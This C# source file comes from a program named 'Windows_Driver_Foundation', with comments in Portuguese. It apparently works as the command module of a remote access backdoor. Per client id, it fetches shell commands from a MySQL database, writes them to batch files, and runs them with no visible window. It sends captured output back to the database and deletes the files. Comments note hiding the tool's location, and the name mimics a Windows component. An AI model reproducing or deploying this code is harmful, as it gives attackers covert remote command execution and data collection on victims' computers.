using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;

namespace Windows_Driver_Foundation
{
    class classProcessShellCommands
    {
        private static classMySQLDatabase classMysql;
        private static classExeptionAndErrorManagement classExeption;

        public void execute_ShellCommands_protocol(int uid)
        {
            classMysql = new classMySQLDatabase();
            classMysql.openDatabaseConnection();
            classExeption = new classExeptionAndErrorManagement();

            List<int> pending_shellCommands = classMysql.getIds_OfShellCommands(uid);

            if (pending_shellCommands.Any())
            {
                classExeption.printConsole("", "ENTOU AQUI");
                foreach (int id_selected in pending_shellCommands)
                {
                    string[] row_fields = classMysql.read_tblShellCommands(id_selected);

                    /*tbl_check_files Fields
                     * row_fields[0] = id
                     * row_fields[1] = client_id
                     * row_fields[2] = start_path
                     * row_fields[3] = commands
                     * row_fields[4] = output
                     * row_fields[5] = vmode
                     * row_fields[5] = last_update
                     * row_fields[7] = order_status (1-pedding, 2-readed, 3-executed, 4-failed, 7- vmode inserido é errado) */

                    classExeption.printConsole("execute_ShellCommands_protocol()", "Id Selected: " + id_selected.ToString() + "     Path: " + row_fields[2]);

                    switch (row_fields[5])
                    {
                        case "1":
                            classExeption.printConsole("[execute_ShellCommands_protocol()", "executed_order " + row_fields[5] + " Entrou no Modo 1");

                            /* Mode 1: (Hidden através de ficheiro)
                             * 1. Cria um batch file e escreve os comandos 
                             * 2. Executa batch file  
                             * 3. WaitForExit
                             * 4. Faz o update do outpute para a BD
                             * 5. Apaga batch file 
                            Intruções de Utilização: Atenção ao path, se escrever no root ex: text.bat posso denunciar a localição no wdf. */
                            try
                            {
                                File.AppendAllText(row_fields[2].Trim(), row_fields[3]);
                            }
                            catch (Exception ex)
                            {
                                classExeption.exeptionHandling(ex.ToString());
                                classMysql.update_ShellCommands(Convert.ToInt32(row_fields[0]), "", 4);
                            }
                            classExeption.printConsole("[execute_ShellCommands_protocol()", "Batch " + row_fields[2] + " criado!");

                            // Execute batch and update to DB
                            classMysql.update_ShellCommands(Convert.ToInt32(row_fields[0]), ExecuteBatchFile(row_fields[2].Trim()), 3);
                            classExeption.printConsole("[execute_ShellCommands_protocol()", "Batch " + row_fields[2] + " criado!");


                            if (File.Exists(row_fields[2].Trim()))
                                File.Delete(row_fields[2].Trim());
                            break;

                        case "2":
                            /*Mode 2
                             * 1- Criar Ficheiro
                             * 2- Executa o ficheiro (Sem consola, sem outputs e sem waitToExit) */

                            classExeption.printConsole("[execute_ShellCommands_protocol()", "executed_order " + row_fields[5] + " Entrou no Modo 2");
                            CreateOrExecuteFileWithAppShutdown(Convert.ToInt32(row_fields[0]), row_fields[2].Trim(), row_fields[3], false);
                            break;

                        case "3":
                            //Mode 3: Igual ao modo 2 mas após a execução o WDF termina imediatamente.
                            classExeption.printConsole("[execute_ShellCommands_protocol()", "executed_order " + row_fields[5] + " Entrou no Modo 3");                         
                            CreateOrExecuteFileWithAppShutdown(Convert.ToInt32(row_fields[0]), row_fields[2].Trim(), row_fields[3], true);
                            break;

                        default:
                            classMysql.update_CheckFiles(id_selected, 7);
                            classExeption.printConsole("[execute_ShellCommands_protocol()", "executed_order " + row_fields[5] + " Entrou no Modo Default");
                            break;
                    }
                }
            }
            else
                classExeption.printConsole("execute_ShellCommands()", "Não têm ordens de Comandos Shell");

            classMysql.closeDatabaseConnection();
        }

        private bool CreateOrExecuteFileWithAppShutdown(int client_id, string file_path, string _content, bool app_shutdown)
        {
            try
            {
                if(File.Exists(file_path))
                    File.WriteAllText(file_path, string.Empty); //clean if file exists

                File.AppendAllText(file_path, _content);

                Console.WriteLine("O ficheiro " + file_path + " foi criado e vai ser executado.");


                if(executeProcess(file_path))
                    classMysql.update_ShellCommands(client_id, "", 3);
                else
                    classMysql.update_ShellCommands(client_id, "", 4);

                if (app_shutdown)
                    Environment.Exit(0);
                return true;
            }
            catch (Exception ex)
            {
                classMysql.update_ShellCommands(client_id, "", 4);
                classExeption.exeptionHandling("CreateOrExecuteFileWithAppShutdown(): " + ex.ToString());
                return false;
            }
        }

        public bool executeProcess(string _path)
        {
            try
            {
                ProcessStartInfo ProcessInfo = new ProcessStartInfo(_path);
                ProcessInfo.CreateNoWindow = true;
                ProcessInfo.UseShellExecute = false;
                Process process = Process.Start(ProcessInfo);
                process.Close();
                return true;
            }
            catch (Exception ex)
            {
                classExeption.exeptionHandling("executeProcess(): " + ex.ToString());
                return false;
            }
        }

        private string ExecuteBatchFile(string batch_path)
        {
            string cmdResult = string.Empty;
            try
            {
                int ExitCode;

                ProcessStartInfo ProcessInfo = new ProcessStartInfo(batch_path);
                ProcessInfo.CreateNoWindow = true;
                ProcessInfo.UseShellExecute = false;
                ProcessInfo.WorkingDirectory = Path.GetDirectoryName(batch_path);
                // *** Redirect the output ***
                ProcessInfo.RedirectStandardError = true;
                ProcessInfo.RedirectStandardOutput = true;

                Process process = Process.Start(ProcessInfo);
                process.WaitForExit();

                // *** Read the streams ***
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                ExitCode = process.ExitCode;

                cmdResult = "Output:" + (String.IsNullOrEmpty(output) ? "(none)" : output);
                cmdResult += "Error:" + (String.IsNullOrEmpty(error) ? "(none)" : error);
                cmdResult += "ExitCode: " + ExitCode.ToString();
                process.Close();
            }
            catch (Exception ex)
            {
                classExeption.exeptionHandling("ExecuteBatchFile: " + ex.ToString());
            }
            return cmdResult;
        }


    }
}